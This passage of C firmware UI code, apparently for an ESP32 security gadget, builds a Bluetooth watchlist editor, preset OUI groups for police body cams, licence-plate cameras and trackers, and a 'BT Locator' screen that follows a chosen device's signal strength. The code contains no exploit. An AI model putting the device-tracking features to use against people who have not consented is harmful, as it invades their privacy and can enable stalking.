    show_oui_groups_screen();
}

static void lookout_edit_btn_cb(lv_event_t *e)
{
    (void)e;
    show_lookout_editor_screen();
}

static void lookout_add_oui_btn_cb(lv_event_t *e)
{
    (void)e;
    show_add_oui_entry_screen();
}

static void lookout_editor_toggle_cb(lv_event_t *e)
{
    int idx = (int)(intptr_t)lv_event_get_user_data(e);
    if (idx < 0 || idx >= s_editor_count) return;
    s_editor_delete[idx] = !s_editor_delete[idx];
    bool del = s_editor_delete[idx];

    if (s_editor_rows[idx] && lv_obj_is_valid(s_editor_rows[idx]))
        lv_obj_set_style_bg_color(s_editor_rows[idx],
            del ? lv_color_make(80, 20, 20) : lv_color_make(40, 40, 40), 0);

    lv_obj_t *btn = lv_event_get_target(e);
    lv_obj_set_style_bg_color(btn,
        del ? COLOR_MATERIAL_RED : lv_color_make(70, 70, 70), LV_STATE_DEFAULT);
    lv_obj_t *lbl = lv_obj_get_child(btn, 0);
    if (lbl) lv_label_set_text(lbl, del ? LV_SYMBOL_TRASH : LV_SYMBOL_CLOSE);
}

static void lookout_editor_save_cb(lv_event_t *ev)
{
    (void)ev;
    ensure_sd_mounted();
    if (sd_spi_mutex && xSemaphoreTake(sd_spi_mutex, pdMS_TO_TICKS(1000)) == pdTRUE) {
        FILE *fp = fopen(BT_LOOKOUT_CSV_PATH, "w");
        if (fp) {
            fwrite(BT_LOOKOUT_CSV_HEADER, 1, strlen(BT_LOOKOUT_CSV_HEADER), fp);
            for (int i = 0; i < s_editor_count; i++) {
                if (s_editor_delete[i]) continue;
                const bt_lookout_entry_t *ent = bt_lookout_get(i);
                if (!ent) continue;
                fprintf(fp, "%02X:%02X:%02X:%02X:%02X:%02X,%s,%d,%d\n",
                        ent->mac[0], ent->mac[1], ent->mac[2],
                        ent->mac[3], ent->mac[4], ent->mac[5],
                        ent->name, ent->rssi_threshold, (int)ent->oui_only);
            }
            fclose(fp);
        }
        bt_lookout_load(BT_LOOKOUT_CSV_PATH);
        xSemaphoreGive(sd_spi_mutex);
    }
    show_bt_lookout_screen();
}

static void lookout_editor_back_cb(lv_event_t *ev)
{
    (void)ev;
    show_bt_lookout_screen();
}

static void show_lookout_editor_screen(void)
{
    s_editor_count = bt_lookout_count();
    memset(s_editor_delete, 0, sizeof(s_editor_delete));
    memset(s_editor_rows,   0, sizeof(s_editor_rows));

    if (function_page) { lv_obj_del(function_page); function_page = NULL; }
    reset_function_page_children();
    bt_lookout_ui_active = false;
    bt_lookout_status_lbl = NULL;
    bt_lookout_count_lbl  = NULL;
    bt_lookout_last_lbl   = NULL;
    bt_lookout_start_btn  = NULL;
    bt_lookout_edit_btn   = NULL;
    bt_lookout_oui_btn    = NULL;

    create_function_page_base("Edit Watchlist");

    /* Scrollable list — leaves room for the bottom buttons */
    lv_obj_t *scroll = lv_obj_create(function_page);
    lv_obj_set_size(scroll, 228, 220);
    lv_obj_align(scroll, LV_ALIGN_TOP_MID, 0, 36);
    lv_obj_set_style_bg_color(scroll, ui_bg_color(), 0);
    lv_obj_set_style_border_width(scroll, 0, 0);
    lv_obj_set_style_pad_all(scroll, 4, 0);
    lv_obj_set_style_pad_row(scroll, 4, 0);
    lv_obj_set_flex_flow(scroll, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(scroll, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_START);

    if (s_editor_count == 0) {
        lv_obj_t *empty = lv_label_create(scroll);
        lv_label_set_text(empty, "Watchlist is empty.\nAdd devices via BT Scan & Select.");
        lv_obj_set_style_text_font(empty, &lv_font_montserrat_14, 0);
        lv_obj_set_style_text_color(empty, lv_color_make(176, 176, 176), 0);
        lv_obj_center(empty);
    }

    for (int i = 0; i < s_editor_count; i++) {
        const bt_lookout_entry_t *ent = bt_lookout_get(i);
        if (!ent) continue;

        /* Row container */
        lv_obj_t *row = lv_obj_create(scroll);
        lv_obj_set_width(row, lv_pct(100));
        lv_obj_set_height(row, LV_SIZE_CONTENT);
        lv_obj_set_style_bg_color(row, lv_color_make(40, 40, 40), 0);
        lv_obj_set_style_border_width(row, 0, 0);
        lv_obj_set_style_radius(row, 6, 0);
        lv_obj_set_style_pad_all(row, 6, 0);
        lv_obj_set_style_pad_column(row, 6, 0);
        lv_obj_set_flex_flow(row, LV_FLEX_FLOW_ROW);
        lv_obj_set_flex_align(row, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
        lv_obj_clear_flag(row, LV_OBJ_FLAG_SCROLLABLE);
        s_editor_rows[i] = row;

        /* Name + MAC column */
        lv_obj_t *info = lv_obj_create(row);
        lv_obj_set_flex_grow(info, 1);
        lv_obj_set_height(info, LV_SIZE_CONTENT);
        lv_obj_set_style_bg_opa(info, LV_OPA_TRANSP, 0);
        lv_obj_set_style_border_width(info, 0, 0);
        lv_obj_set_style_pad_all(info, 0, 0);
        lv_obj_set_flex_flow(info, LV_FLEX_FLOW_COLUMN);
        lv_obj_set_flex_align(info, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_START);
        lv_obj_clear_flag(info, LV_OBJ_FLAG_SCROLLABLE);

        lv_obj_t *name_lbl = lv_label_create(info);
        lv_label_set_text(name_lbl, ent->name[0] ? ent->name : "Unknown");
        lv_obj_set_style_text_font(name_lbl, &lv_font_montserrat_14, 0);
        lv_obj_set_style_text_color(name_lbl, ui_text_color(), 0);
        lv_label_set_long_mode(name_lbl, LV_LABEL_LONG_DOT);
        lv_obj_set_width(name_lbl, 150);

        char mac_str[24];
        if (ent->oui_only) {
            snprintf(mac_str, sizeof(mac_str), "OUI: %02X:%02X:%02X:*",
                     ent->mac[0], ent->mac[1], ent->mac[2]);
        } else {
            snprintf(mac_str, sizeof(mac_str), "%02X:%02X:%02X:%02X:%02X:%02X",
                     ent->mac[0], ent->mac[1], ent->mac[2],
                     ent->mac[3], ent->mac[4], ent->mac[5]);
        }
        lv_obj_t *mac_lbl = lv_label_create(info);
        lv_label_set_text(mac_lbl, mac_str);
        lv_obj_set_style_text_font(mac_lbl, &lv_font_montserrat_12, 0);
        lv_obj_set_style_text_color(mac_lbl, lv_color_make(140, 140, 140), 0);

        /* Delete toggle button */
        lv_obj_t *del_btn = lv_btn_create(row);
        lv_obj_set_size(del_btn, 40, 40);
        lv_obj_set_style_bg_color(del_btn, lv_color_make(70, 70, 70), LV_STATE_DEFAULT);
        lv_obj_set_style_bg_color(del_btn, lv_color_make(100, 100, 100), LV_STATE_PRESSED);
        lv_obj_set_style_border_width(del_btn, 0, 0);
        lv_obj_set_style_radius(del_btn, 6, 0);
        lv_obj_set_style_pad_all(del_btn, 4, 0);
        lv_obj_t *del_icon = lv_label_create(del_btn);
        lv_label_set_text(del_icon, LV_SYMBOL_CLOSE);
        lv_obj_set_style_text_font(del_icon, &lv_font_montserrat_14, 0);
        lv_obj_set_style_text_color(del_icon, lv_color_make(200, 200, 200), 0);
        lv_obj_center(del_icon);
        lv_obj_add_event_cb(del_btn, lookout_editor_toggle_cb, LV_EVENT_CLICKED,
                            (void *)(intptr_t)i);
    }

    /* Bottom button row: [Back]  [Save] */
    lv_obj_t *btn_row = lv_obj_create(function_page);
    lv_obj_set_size(btn_row, 228, 36);
    lv_obj_align(btn_row, LV_ALIGN_BOTTOM_MID, 0, -8);
    lv_obj_set_style_bg_opa(btn_row, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(btn_row, 0, 0);
    lv_obj_set_style_pad_all(btn_row, 0, 0);
    lv_obj_set_style_pad_column(btn_row, 8, 0);
    lv_obj_set_flex_flow(btn_row, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(btn_row, LV_FLEX_ALIGN_SPACE_BETWEEN, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_clear_flag(btn_row, LV_OBJ_FLAG_SCROLLABLE);

    /* Back button */
    lv_obj_t *back_btn = lv_btn_create(btn_row);
    lv_obj_set_size(back_btn, 68, 32);
    lv_obj_set_style_bg_color(back_btn, lv_color_make(60, 60, 60), LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(back_btn, lv_color_make(90, 90, 90), LV_STATE_PRESSED);
    lv_obj_set_style_border_width(back_btn, 0, 0);
    lv_obj_set_style_radius(back_btn, 8, 0);
    lv_obj_t *bk_lbl = lv_label_create(back_btn);
    lv_label_set_text(bk_lbl, LV_SYMBOL_LEFT " Back");
    lv_obj_set_style_text_font(bk_lbl, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_color(bk_lbl, ui_text_color(), 0);
    lv_obj_center(bk_lbl);
    lv_obj_add_event_cb(back_btn, lookout_editor_back_cb, LV_EVENT_CLICKED, NULL);

    /* Add OUI button */
    lv_obj_t *add_oui_btn = lv_btn_create(btn_row);
    lv_obj_set_size(add_oui_btn, 80, 32);
    lv_obj_set_style_bg_color(add_oui_btn, lv_color_make(30, 80, 160), LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(add_oui_btn, lv_color_make(50, 110, 200), LV_STATE_PRESSED);
    lv_obj_set_style_border_width(add_oui_btn, 0, 0);
    lv_obj_set_style_radius(add_oui_btn, 8, 0);
    lv_obj_t *ao_lbl = lv_label_create(add_oui_btn);
    lv_label_set_text(ao_lbl, LV_SYMBOL_PLUS " OUI");
    lv_obj_set_style_text_font(ao_lbl, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_color(ao_lbl, lv_color_white(), 0);
    lv_obj_center(ao_lbl);
    lv_obj_add_event_cb(add_oui_btn, lookout_add_oui_btn_cb, LV_EVENT_CLICKED, NULL);

    /* Save button */
    lv_obj_t *save_btn = lv_btn_create(btn_row);
    lv_obj_set_size(save_btn, 68, 32);
    lv_obj_set_style_bg_color(save_btn, COLOR_MATERIAL_GREEN, LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(save_btn, lv_color_lighten(COLOR_MATERIAL_GREEN, 40), LV_STATE_PRESSED);
    lv_obj_set_style_border_width(save_btn, 0, 0);
    lv_obj_set_style_radius(save_btn, 8, 0);
    lv_obj_set_flex_flow(save_btn, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(save_btn, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_column(save_btn, 4, 0);
    lv_obj_t *sv_icon = lv_label_create(save_btn);
    lv_label_set_text(sv_icon, LV_SYMBOL_SAVE);
    lv_obj_set_style_text_font(sv_icon, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(sv_icon, lv_color_white(), 0);
    lv_obj_t *sv_lbl = lv_label_create(save_btn);
    lv_label_set_text(sv_lbl, "Save");
    lv_obj_set_style_text_font(sv_lbl, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(sv_lbl, lv_color_white(), 0);
    lv_obj_add_event_cb(save_btn, lookout_editor_save_cb, LV_EVENT_CLICKED, NULL);
}

/* ── Add OUI Entry screen ─────────────────────────────────────────── */

static lv_obj_t *add_oui_ta      = NULL;   /* OUI text area */
static lv_obj_t *add_oui_name_ta = NULL;   /* label text area */
static lv_obj_t *add_oui_kb      = NULL;   /* shared keyboard */

static void add_oui_ta_focus_cb(lv_event_t *e)
{
    lv_obj_t *ta = lv_event_get_target(e);
    if (add_oui_kb && lv_obj_is_valid(add_oui_kb))
        lv_keyboard_set_textarea(add_oui_kb, ta);
}

static void add_oui_back_cb(lv_event_t *e)
{
    (void)e;
    add_oui_ta      = NULL;
    add_oui_name_ta = NULL;
    add_oui_kb      = NULL;
    show_lookout_editor_screen();
}

static void add_oui_confirm_cb(lv_event_t *e)
{
    (void)e;
    if (!add_oui_ta || !lv_obj_is_valid(add_oui_ta)) return;

    const char *oui_str  = lv_textarea_get_text(add_oui_ta);
    const char *name_str = (add_oui_name_ta && lv_obj_is_valid(add_oui_name_ta))
                           ? lv_textarea_get_text(add_oui_name_ta) : "";

    uint8_t oui[3] = {0, 0, 0};
    bool ok = false;

    /* Accept "AA:BB:CC", "AA-BB-CC", or raw "AABBCC" */
    if (sscanf(oui_str, "%hhx:%hhx:%hhx", &oui[0], &oui[1], &oui[2]) == 3)
        ok = true;
    else if (sscanf(oui_str, "%hhx-%hhx-%hhx", &oui[0], &oui[1], &oui[2]) == 3)
        ok = true;
    else if (strlen(oui_str) >= 6) {
        char tmp[7]; strncpy(tmp, oui_str, 6); tmp[6] = '\0';
        if (sscanf(tmp, "%2hhx%2hhx%2hhx", &oui[0], &oui[1], &oui[2]) == 3)
            ok = true;
    }

    if (!ok) {
        lv_textarea_set_text(add_oui_ta, "");
        lv_textarea_set_placeholder_text(add_oui_ta, "Bad format — try AA:BB:CC");
        return;
    }

    uint8_t oui_mac[6] = { oui[0], oui[1], oui[2], 0, 0, 0 };
    bt_lookout_append(BT_LOOKOUT_CSV_PATH, oui_mac,
                      (name_str && name_str[0]) ? name_str : NULL,
                      BT_LOOKOUT_RSSI_ANY, true);

    add_oui_ta      = NULL;
    add_oui_name_ta = NULL;
    add_oui_kb      = NULL;
    show_lookout_editor_screen();
}

static void show_add_oui_entry_screen(void)
{
    add_oui_ta      = NULL;
    add_oui_name_ta = NULL;
    add_oui_kb      = NULL;

    if (function_page) { lv_obj_del(function_page); function_page = NULL; }
    reset_function_page_children();
    bt_lookout_ui_active  = false;
    bt_lookout_status_lbl = NULL;
    bt_lookout_count_lbl  = NULL;
    bt_lookout_last_lbl   = NULL;
    bt_lookout_start_btn  = NULL;
    bt_lookout_edit_btn   = NULL;
    bt_lookout_oui_btn    = NULL;

    create_function_page_base("Add OUI Entry");

    /* Hint label */
    lv_obj_t *hint = lv_label_create(function_page);
    lv_label_set_text(hint, "OUI prefix  e.g.  AA:BB:CC");
    lv_obj_set_style_text_font(hint, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_color(hint, lv_color_make(140, 140, 140), 0);
    lv_obj_align(hint, LV_ALIGN_TOP_MID, 0, 36);

    /* OUI text area */
    add_oui_ta = lv_textarea_create(function_page);
    lv_obj_set_size(add_oui_ta, 210, 38);
    lv_obj_align(add_oui_ta, LV_ALIGN_TOP_MID, 0, 52);
    lv_textarea_set_one_line(add_oui_ta, true);
    lv_textarea_set_max_length(add_oui_ta, 8);   /* "AA:BB:CC" */
    lv_textarea_set_placeholder_text(add_oui_ta, "AA:BB:CC");
    lv_obj_set_style_text_font(add_oui_ta, &lv_font_montserrat_16, 0);
    lv_obj_add_event_cb(add_oui_ta, add_oui_ta_focus_cb, LV_EVENT_CLICKED, NULL);

    /* Label / name text area */
    add_oui_name_ta = lv_textarea_create(function_page);
    lv_obj_set_size(add_oui_name_ta, 210, 36);
    lv_obj_align(add_oui_name_ta, LV_ALIGN_TOP_MID, 0, 98);
    lv_textarea_set_one_line(add_oui_name_ta, true);
    lv_textarea_set_max_length(add_oui_name_ta, 31);
    lv_textarea_set_placeholder_text(add_oui_name_ta, "Label (optional)");
    lv_obj_set_style_text_font(add_oui_name_ta, &lv_font_montserrat_14, 0);
    lv_obj_add_event_cb(add_oui_name_ta, add_oui_ta_focus_cb, LV_EVENT_CLICKED, NULL);

    /* Button row */
    lv_obj_t *btn_row = lv_obj_create(function_page);
    lv_obj_set_size(btn_row, 228, 36);
    lv_obj_align(btn_row, LV_ALIGN_TOP_MID, 0, 142);
    lv_obj_set_style_bg_opa(btn_row, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(btn_row, 0, 0);
    lv_obj_set_style_pad_all(btn_row, 0, 0);
    lv_obj_set_style_pad_column(btn_row, 8, 0);
    lv_obj_set_flex_flow(btn_row, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(btn_row, LV_FLEX_ALIGN_SPACE_BETWEEN,
                           LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_clear_flag(btn_row, LV_OBJ_FLAG_SCROLLABLE);

    lv_obj_t *back_btn = lv_btn_create(btn_row);
    lv_obj_set_size(back_btn, 104, 34);
    lv_obj_set_style_bg_color(back_btn, lv_color_make(60, 60, 60), LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(back_btn, lv_color_make(90, 90, 90), LV_STATE_PRESSED);
    lv_obj_set_style_border_width(back_btn, 0, 0);
    lv_obj_set_style_radius(back_btn, 8, 0);
    lv_obj_t *bk_lbl = lv_label_create(back_btn);
    lv_label_set_text(bk_lbl, LV_SYMBOL_LEFT " Back");
    lv_obj_set_style_text_font(bk_lbl, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(bk_lbl, ui_text_color(), 0);
    lv_obj_center(bk_lbl);
    lv_obj_add_event_cb(back_btn, add_oui_back_cb, LV_EVENT_CLICKED, NULL);

    lv_obj_t *add_btn = lv_btn_create(btn_row);
    lv_obj_set_size(add_btn, 104, 34);
    lv_obj_set_style_bg_color(add_btn, lv_color_make(30, 100, 180), LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(add_btn, lv_color_make(50, 130, 220), LV_STATE_PRESSED);
    lv_obj_set_style_border_width(add_btn, 0, 0);
    lv_obj_set_style_radius(add_btn, 8, 0);
    lv_obj_t *add_lbl = lv_label_create(add_btn);
    lv_label_set_text(add_lbl, LV_SYMBOL_PLUS " Add OUI");
    lv_obj_set_style_text_font(add_lbl, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(add_lbl, lv_color_white(), 0);
    lv_obj_center(add_lbl);
    lv_obj_add_event_cb(add_btn, add_oui_confirm_cb, LV_EVENT_CLICKED, NULL);

    /* Keyboard — upper case for hex, anchored to bottom */
    add_oui_kb = lv_keyboard_create(function_page);
    lv_keyboard_set_textarea(add_oui_kb, add_oui_ta);
    lv_keyboard_set_mode(add_oui_kb, LV_KEYBOARD_MODE_TEXT_UPPER);
    lv_obj_set_size(add_oui_kb, lv_pct(100), lv_pct(40));
    lv_obj_align(add_oui_kb, LV_ALIGN_BOTTOM_MID, 0, 0);
    lv_obj_set_style_bg_color(add_oui_kb, ui_bg_color(), LV_PART_MAIN);
    lv_obj_set_style_text_color(add_oui_kb, ui_text_color(), LV_PART_MAIN);
    lv_obj_set_style_bg_color(add_oui_kb, lv_color_make(40, 40, 60), LV_PART_ITEMS);
    lv_obj_set_style_bg_color(add_oui_kb, lv_color_make(70, 70, 100),
                               LV_PART_ITEMS | LV_STATE_PRESSED);
    lv_obj_set_style_text_color(add_oui_kb, ui_text_color(), LV_PART_ITEMS);
    lv_obj_set_style_border_color(add_oui_kb, ui_border_color(), LV_PART_ITEMS);
    lv_obj_set_style_border_width(add_oui_kb, 1, LV_PART_ITEMS);
}

/* ── OUI Groups screen ────────────────────────────────────────────── */

typedef struct {
    const char *name;
    const char *description;
    uint8_t     ouis[4][3];
    int         oui_count;
} oui_group_def_t;

static const oui_group_def_t OUI_GROUPS[] = {
    { "Axon Body Cam",      "Law enforcement body cameras",
      {{0x00, 0x25, 0xDF}}, 1 },
    { "Flock Safety ALPR",  "License plate reader cameras",
      {{0x70, 0xC9, 0x4E}, {0x3C, 0x91, 0x80}, {0xD8, 0xF3, 0xBC}}, 3 },
    { "Motorola Solutions", "Two-way radio / body cam",
      {{0x4C, 0xCC, 0x34}}, 1 },
    { "Samsung SmartTag",   "Bluetooth tracker",
      {{0x64, 0x1B, 0x2F}}, 1 },
};
static const int OUI_GROUPS_COUNT = (int)(sizeof(OUI_GROUPS) / sizeof(OUI_GROUPS[0]));

static void oui_group_add_cb(lv_event_t *e)
{
    int idx = (int)(intptr_t)lv_event_get_user_data(e);
    if (idx < 0 || idx >= OUI_GROUPS_COUNT) return;
    const oui_group_def_t *grp = &OUI_GROUPS[idx];

    ensure_sd_mounted();
    bool ok = false;
    if (sd_spi_mutex && xSemaphoreTake(sd_spi_mutex, pdMS_TO_TICKS(1000)) == pdTRUE) {
        ok = true;
        for (int i = 0; i < grp->oui_count; i++) {
            uint8_t oui_mac[6] = {grp->ouis[i][0], grp->ouis[i][1], grp->ouis[i][2], 0, 0, 0};
            if (!bt_lookout_append(BT_LOOKOUT_CSV_PATH, oui_mac, grp->name,
                                   BT_LOOKOUT_RSSI_ANY, true)) ok = false;
        }
        xSemaphoreGive(sd_spi_mutex);
    }

    /* Visual feedback on the tapped button */
    lv_obj_t *btn = lv_event_get_target(e);
    lv_obj_set_style_bg_color(btn,
        ok ? lv_color_make(20, 80, 20) : lv_color_make(80, 20, 20), LV_STATE_DEFAULT);
    lv_obj_t *lbl = lv_obj_get_child(btn, 0);
    if (lbl && lv_obj_is_valid(lbl))
        lv_label_set_text(lbl, ok ? "Added!" : "Failed!");
}

static void oui_groups_back_cb(lv_event_t *e)
{
    (void)e;
    show_bt_lookout_screen();
}

static void show_oui_groups_screen(void)
{
    if (function_page) { lv_obj_del(function_page); function_page = NULL; }
    reset_function_page_children();
    bt_lookout_ui_active = false;
    bt_lookout_status_lbl = NULL;
    bt_lookout_count_lbl  = NULL;
    bt_lookout_last_lbl   = NULL;
    bt_lookout_start_btn  = NULL;
    bt_lookout_edit_btn   = NULL;
    bt_lookout_oui_btn    = NULL;

    create_function_page_base("OUI Groups");

    /* Scrollable group list */
    lv_obj_t *scroll = lv_obj_create(function_page);
    lv_obj_set_size(scroll, 228, LCD_V_RES - 30 - 6 - 38 - 6);
    lv_obj_align(scroll, LV_ALIGN_TOP_MID, 0, 32);
    lv_obj_set_style_bg_color(scroll, ui_bg_color(), 0);
    lv_obj_set_style_border_width(scroll, 0, 0);
    lv_obj_set_style_pad_all(scroll, 4, 0);
    lv_obj_set_style_pad_row(scroll, 6, 0);
    lv_obj_set_flex_flow(scroll, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(scroll, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_START);

    for (int g = 0; g < OUI_GROUPS_COUNT; g++) {
        const oui_group_def_t *grp = &OUI_GROUPS[g];

        lv_obj_t *card = lv_obj_create(scroll);
        lv_obj_set_width(card, lv_pct(100));
        lv_obj_set_height(card, LV_SIZE_CONTENT);
        lv_obj_set_style_bg_color(card, ui_card_color(), 0);
        lv_obj_set_style_border_color(card, lv_color_make(70, 30, 120), 0);
        lv_obj_set_style_border_width(card, 1, 0);
        lv_obj_set_style_radius(card, 6, 0);
        lv_obj_set_style_pad_all(card, 6, 0);
        lv_obj_set_style_pad_row(card, 3, 0);
        lv_obj_set_flex_flow(card, LV_FLEX_FLOW_COLUMN);
        lv_obj_clear_flag(card, LV_OBJ_FLAG_SCROLLABLE);

        /* Group name */
        lv_obj_t *name_lbl = lv_label_create(card);
        lv_label_set_text(name_lbl, grp->name);
        lv_obj_set_style_text_font(name_lbl, &lv_font_montserrat_14, 0);
        lv_obj_set_style_text_color(name_lbl, ui_text_color(), 0);

        /* Description */
        lv_obj_t *desc_lbl = lv_label_create(card);
        lv_label_set_text(desc_lbl, grp->description);
        lv_obj_set_style_text_font(desc_lbl, &lv_font_montserrat_12, 0);
        lv_obj_set_style_text_color(desc_lbl, lv_color_make(140, 140, 140), 0);

        /* OUI prefix list */
        char oui_buf[64];
        int  off = 0;
        for (int i = 0; i < grp->oui_count && off < (int)sizeof(oui_buf) - 12; i++) {
            if (i > 0) { oui_buf[off++] = ' '; }
            off += snprintf(oui_buf + off, sizeof(oui_buf) - (size_t)off,
                            "%02X:%02X:%02X:*",
                            grp->ouis[i][0], grp->ouis[i][1], grp->ouis[i][2]);
        }
        lv_obj_t *oui_lbl = lv_label_create(card);
        lv_label_set_text(oui_lbl, oui_buf);
        lv_obj_set_style_text_font(oui_lbl, &lv_font_montserrat_12, 0);
        lv_obj_set_style_text_color(oui_lbl, lv_color_make(100, 200, 100), 0);
        lv_label_set_long_mode(oui_lbl, LV_LABEL_LONG_WRAP);
        lv_obj_set_width(oui_lbl, lv_pct(100));

        /* Add to Watchlist button */
        lv_obj_t *add_btn = lv_btn_create(card);
        lv_obj_set_size(add_btn, 150, 26);
        lv_obj_set_style_bg_color(add_btn, COLOR_MATERIAL_GREEN, LV_STATE_DEFAULT);
        lv_obj_set_style_bg_color(add_btn, lv_color_lighten(COLOR_MATERIAL_GREEN, 40), LV_STATE_PRESSED);
        lv_obj_set_style_border_width(add_btn, 0, 0);
        lv_obj_set_style_radius(add_btn, 6, 0);
        lv_obj_t *add_lbl = lv_label_create(add_btn);
        lv_label_set_text(add_lbl, "+ Add to Watchlist");
        lv_obj_set_style_text_font(add_lbl, &lv_font_montserrat_12, 0);
        lv_obj_set_style_text_color(add_lbl, lv_color_white(), 0);
        lv_obj_center(add_lbl);
        lv_obj_add_event_cb(add_btn, oui_group_add_cb, LV_EVENT_CLICKED, (void *)(intptr_t)g);
    }

    /* Back button */
    lv_obj_t *back_btn = lv_btn_create(function_page);
    lv_obj_set_size(back_btn, 110, 30);
    lv_obj_align(back_btn, LV_ALIGN_BOTTOM_MID, 0, -6);
    lv_obj_set_style_bg_color(back_btn, lv_color_make(60, 60, 60), LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(back_btn, lv_color_make(90, 90, 90), LV_STATE_PRESSED);
    lv_obj_set_style_border_width(back_btn, 0, 0);
    lv_obj_set_style_radius(back_btn, 8, 0);
    lv_obj_set_flex_flow(back_btn, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(back_btn, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_column(back_btn, 4, 0);
    lv_obj_t *b_icon = lv_label_create(back_btn);
    lv_label_set_text(b_icon, LV_SYMBOL_LEFT);
    lv_obj_set_style_text_font(b_icon, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(b_icon, ui_text_color(), 0);
    lv_obj_t *b_lbl = lv_label_create(back_btn);
    lv_label_set_text(b_lbl, "Back");
    lv_obj_set_style_text_font(b_lbl, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(b_lbl, ui_text_color(), 0);
    lv_obj_add_event_cb(back_btn, oui_groups_back_cb, LV_EVENT_CLICKED, NULL);
}

// Bluetooth screen
static void show_bluetooth_screen(void)
{
    create_function_page_base("Bluetooth");
    apply_menu_bg();

    lv_obj_t *tiles = lv_obj_create(function_page);
    lv_obj_set_size(tiles, lv_pct(100), LCD_V_RES - 30);
    lv_obj_align(tiles, LV_ALIGN_BOTTOM_MID, 0, 0);
    lv_obj_set_style_bg_opa(tiles, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(tiles, 0, 0);
    lv_obj_set_style_pad_all(tiles, 10, 0);
    lv_obj_set_style_pad_gap(tiles, 10, 0);
    lv_obj_set_flex_flow(tiles, LV_FLEX_FLOW_ROW_WRAP);
    lv_obj_set_flex_align(tiles, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    
    // BT Scan & Select - first tile, cyan
    lv_obj_t *btsas_tile = create_tile(tiles, MY_SYMBOL_BLUETOOTH_B, "BT Scan\n& Select", UI_ACCENT_CYAN, NULL, NULL);
    lv_obj_add_event_cb(btsas_tile, (lv_event_cb_t)attack_event_cb, LV_EVENT_CLICKED, (void*)"BT Scan & Select");

    // AirTag scan - Apple-like gray
    lv_obj_t *airtag_tile = create_tile(tiles, MY_SYMBOL_BLUETOOTH_B, "AirTag\nScan", lv_color_make(142, 142, 147), NULL, NULL);
    lv_obj_add_event_cb(airtag_tile, (lv_event_cb_t)attack_event_cb, LV_EVENT_CLICKED, (void*)"AirTag scan");

    // BT Locator - Blue
    lv_obj_t *locator_tile = create_tile(tiles, MY_SYMBOL_BLUETOOTH_B, "BT Locator", COLOR_TILE_BLUE, NULL, NULL);
    lv_obj_add_event_cb(locator_tile, (lv_event_cb_t)attack_event_cb, LV_EVENT_CLICKED, (void*)"BT Locator");

    // BT Lookout - Red
    lv_obj_t *lookout_tile = create_tile(tiles, MY_SYMBOL_BLUETOOTH_B, "BT\nLookout", COLOR_MATERIAL_RED, NULL, NULL);
    lv_obj_add_event_cb(lookout_tile, (lv_event_cb_t)attack_event_cb, LV_EVENT_CLICKED, (void*)"Dee Dee Detector");
}

// BT Locator screen - scan BT devices, select one, then track RSSI every 10s
static void show_bt_locator_screen(void)
{
    ui_locked = true;
    if (function_page) { lv_obj_del(function_page); function_page = NULL; }
    reset_function_page_children();
    
    // Create base page with title "Bluetooth Locator"
    create_function_page_base("Bluetooth Locator");
    bt_locator_ui_active = true;
    bt_locator_tracking_active = false;
    bt_tracking_mode = false;
    
    // Content container - positioned below title bar (30px)
    bt_locator_content = lv_obj_create(function_page);
    lv_obj_set_size(bt_locator_content, lv_pct(100), LCD_V_RES - 30 - 43);  // Leave space for title and exit btn
    lv_obj_align(bt_locator_content, LV_ALIGN_TOP_MID, 0, 30);  // Start below title bar
    lv_obj_set_style_bg_opa(bt_locator_content, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(bt_locator_content, 0, 0);
    lv_obj_set_style_pad_all(bt_locator_content, 5, 0);
    lv_obj_clear_flag(bt_locator_content, LV_OBJ_FLAG_SCROLLABLE);

    // Status label centered - "BT scanning..." (will be hidden when list/tracking shown)
    bt_locator_status_label = lv_label_create(bt_locator_content);
    lv_label_set_text(bt_locator_status_label, "BT scanning...");
    lv_obj_set_style_text_color(bt_locator_status_label, ui_text_color(), 0);
    lv_obj_set_style_text_font(bt_locator_status_label, &lv_font_montserrat_16, 0);
    lv_obj_center(bt_locator_status_label);

    // Header label above list (hidden until scan complete)
    lv_obj_t *list_header = lv_label_create(bt_locator_content);
    lv_label_set_text(list_header, "Select BT Target:");
    lv_obj_set_style_text_color(list_header, ui_text_color(), 0);
    lv_obj_set_style_text_font(list_header, &lv_font_montserrat_14, 0);
